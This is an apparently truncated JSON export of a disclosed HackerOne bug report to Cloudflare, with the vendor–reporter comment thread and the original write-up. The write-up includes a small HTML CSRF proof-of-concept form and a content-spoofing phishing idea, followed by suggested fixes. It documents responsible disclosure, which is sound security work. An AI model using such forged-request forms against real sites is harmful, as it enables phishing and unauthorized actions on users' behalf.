            "updated_at": "2014-06-03T18:28:52.102Z", 
            "actor": {
                "username": "internetwache", 
                "url": "/internetwache", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/637/8348ca3c21da8852460671dd8d6adef203301b70_medium.png?1391551035"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "Hi @dknecht,\nit seems like the issue has been resolved.\n\nThanks,\nSebastian", 
            "markdown_message": "<p>Hi <a href=\"/dknecht\">@dknecht</a>,<br>\nit seems like the issue has been resolved.</p>\n\n<p>Thanks,<br>\nSebastian</p>\n", 
            "type": "Activities::Comment", 
            "id": 65352, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-06-07T18:24:18.372Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-06-07T18:24:18.372Z", 
            "actor": {
                "username": "internetwache", 
                "url": "/internetwache", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/637/8348ca3c21da8852460671dd8d6adef203301b70_medium.png?1391551035"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 68962, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-07-08T10:00:22.938Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-07-08T10:00:22.938Z", 
            "actor": {
                "url": "/cloudflare", 
                "profile": {
                    "name": "Cloudflare"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/041/d2c3c5a370ea69f13c0c96e2a2498501429e6b30_medium.png?1480719394"
                }
            }, 
            "team_handle": "cloudflare", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 85900, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-08-01T16:40:57.017Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-08-01T16:40:57.017Z", 
            "actor": {
                "username": "justin", 
                "url": "/justin", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/714/2eebae8eb32960de24af801c8d5ad15051291cf0_medium.png?1395966322"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "Hi,\n\nAs an update here, this issue was accepted and corrected. \n\nWe will be in touch regarding the bounty for the report.", 
            "markdown_message": "<p>Hi,</p>\n\n<p>As an update here, this issue was accepted and corrected. </p>\n\n<p>We will be in touch regarding the bounty for the report.</p>\n", 
            "type": "Activities::Comment", 
            "id": 99079, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-08-01T16:43:13.540Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-08-01T16:43:13.540Z", 
            "actor": {
                "username": "internetwache", 
                "url": "/internetwache", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/637/8348ca3c21da8852460671dd8d6adef203301b70_medium.png?1391551035"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "Hi @justin,\nthanks for the update!\n\nI'll be on vacation from this sunday, so please do not wonder if I do not reply within the next 3 weeks or so :)\n\nLooking forward to the bounty.\n\nBest regards,\nSebastian", 
            "markdown_message": "<p>Hi <a href=\"/justin\">@justin</a>,<br>\nthanks for the update!</p>\n\n<p>I&#39;ll be on vacation from this sunday, so please do not wonder if I do not reply within the next 3 weeks or so :)</p>\n\n<p>Looking forward to the bounty.</p>\n\n<p>Best regards,<br>\nSebastian</p>\n", 
            "type": "Activities::Comment", 
            "id": 99084, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-08-08T16:56:14.225Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-08-08T16:56:14.225Z", 
            "actor": {
                "username": "jamie", 
                "url": "/jamie", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/767/9125908c121e9bd8929fb83a268cbfadb1ed08d9_medium.png?1398090245"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "We apologize for the delay in reward fulfillment, but look out for an email requesting your shirt size, address, and other information needed for fulfillment next week. Thank you.", 
            "markdown_message": "<p>We apologize for the delay in reward fulfillment, but look out for an email requesting your shirt size, address, and other information needed for fulfillment next week. Thank you.</p>\n", 
            "type": "Activities::Comment", 
            "id": 103151, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-08-23T15:52:53.554Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-08-23T15:52:53.554Z", 
            "actor": {
                "username": "internetwache", 
                "url": "/internetwache", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/637/8348ca3c21da8852460671dd8d6adef203301b70_medium.png?1391551035"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "cloudflare", 
            "message": "Hi @jamie,\nthanks for the note!\n\nI got the email and will reply in the next couple of days.\n\nBest regards,\nSebastian", 
            "markdown_message": "<p>Hi <a href=\"/jamie\">@jamie</a>,<br>\nthanks for the note!</p>\n\n<p>I got the email and will reply in the next couple of days.</p>\n\n<p>Best regards,<br>\nSebastian</p>\n", 
            "type": "Activities::Comment", 
            "id": 114475, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "internetwache", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/internetwache", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/637/8f65c1a8494da6e5abf6b28a673318e3bcb03443_small.png?1391551035"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 57, 
        "name": "Violation of Secure Design Principles"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -139771758.96523723, 
    "disclosed_at": "2014-07-08T10:00:22.927Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/8806", 
    "created_at": "2014-04-21T19:45:54.373Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Hi there,</p>\n\n<p>I noticed two things on the following url: <a title=\"https://www.cloudflare.com/ajax/modal-dialog.html\" href=\"/redirect?signature=b0641cebca25fd333473be28d4ba7bc5ce50fab3&amp;url=https%3A%2F%2Fwww.cloudflare.com%2Fajax%2Fmodal-dialog.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.cloudflare.com/ajax/modal-dialog.html</span><i class=\"icon-external-link\"></i></a></p>\n\n<h2 id=\"1-csrf\">1. CSRF</h2>\n\n<p>There are some csrf countermeasures in place (e.g. X-Requested-With: XMLHttpRequest), however they&#39;re not validated on the server. </p>\n\n<p>This leads to an uncritical csrf:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n  <span class=\"nt\">&lt;body&gt;</span>\n    <span class=\"nt\">&lt;form</span> <span class=\"na\">action=</span><span class=\"s\">&quot;https://www.cloudflare.com/ajax/modal-dialog.html&quot;</span> <span class=\"na\">method=</span><span class=\"s\">&quot;POST&quot;</span><span class=\"nt\">&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;type&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;default&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;hidden&quot;</span> <span class=\"na\">name=</span><span class=\"s\">&quot;content&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;This&amp;#32;is&amp;#32;my&amp;#32;content&quot;</span> <span class=\"nt\">/&gt;</span>\n      <span class=\"nt\">&lt;input</span> <span class=\"na\">type=</span><span class=\"s\">&quot;submit&quot;</span> <span class=\"na\">value=</span><span class=\"s\">&quot;Submit request&quot;</span> <span class=\"nt\">/&gt;</span>\n    <span class=\"nt\">&lt;/form&gt;</span>\n  <span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<h2 id=\"2-content-spoofing\">2. Content spoofing</h2>\n\n<p>Using 1.) I can send some abitary content within the <code>content</code> parameter to my victim. </p>\n\n<p>The <code>Content-Type</code> is <code>text/html</code>, however I was not able to break the filter and conduct a xss at the first glance.</p>\n\n<p>As said, I could send an abitary message fomatted with new-lines to my victim telling him to send over some details or something (be creative here :) ). That would result in a (lame) phishing attack.</p>\n\n<h1 id=\"what-should-you-fix\">What should you fix?</h1>\n\n<ul>\n<li>Set a better Content-Type. E.g. &quot;text/plain&quot; \n\n<ul>\n<li>Validate the CSRF headers</li>\n<li>Do not send the displayed error message in the request. (e.g. hardcode those message and pass an ID depending on the situation).</li>\n</ul>\n</li>\n</ul>\n\n<p>Let me know, what you think about this.</p>\n\n<p>Thanks,<br>\nSebastian</p>\n", 
    "vulnerability_information": "Hi there,\r\n\r\nI noticed two things on the following url: https://www.cloudflare.com/ajax/modal-dialog.html\r\n\r\n##1. CSRF\r\nThere are some csrf countermeasures in place (e.g. X-Requested-With: XMLHttpRequest), however they're not validated on the server. \r\n\r\nThis leads to an uncritical csrf:\r\n\r\n```\r\n<html>\r\n  <body>\r\n    <form action=\"https://www.cloudflare.com/ajax/modal-dialog.html\" method=\"POST\">\r\n      <input type=\"hidden\" name=\"type\" value=\"default\" />\r\n      <input type=\"hidden\" name=\"content\" value=\"This&#32;is&#32;my&#32;content\" />\r\n      <input type=\"submit\" value=\"Submit request\" />\r\n    </form>\r\n  </body>\r\n</html>\r\n```\r\n\r\n##2. Content spoofing\r\nUsing 1.) I can send some abitary content within the ```content``` parameter to my victim. \r\n\r\nThe ```Content-Type``` is ```text/html```, however I was not able to break the filter and conduct a xss at the first glance.\r\n\r\nAs said, I could send an abitary message fomatted with new-lines to my victim telling him to send over some details or something (be creative here :) ). That would result in a (lame) phishing attack.\r\n\r\n#What should you fix?\r\n - Set a better Content-Type. E.g. \"text/plain\" \r\n- Validate the CSRF headers\r\n- Do not send the displayed error message in the request. (e.g. hardcode those message and pass an ID depending on the situation).\r\n\r\nLet me know, what you think about this.\r\n\r\nThanks,\r\nSebastian", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.cloudflare.com/disclosure", 
            "about": "", 
            "twitter_handle": "cloudflare", 
            "name": "Cloudflare"
        }, 
        "handle": "cloudflare", 
        "url": "https://hackerone.com/cloudflare", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/041/b9941bf2330424daec112aade53c7f8c19708cac_small.png?1480719394", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/041/d2c3c5a370ea69f13c0c96e2a2498501429e6b30_medium.png?1480719394"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 41, 
        "default_currency": "usd"
    }, 
    "is_published": false
}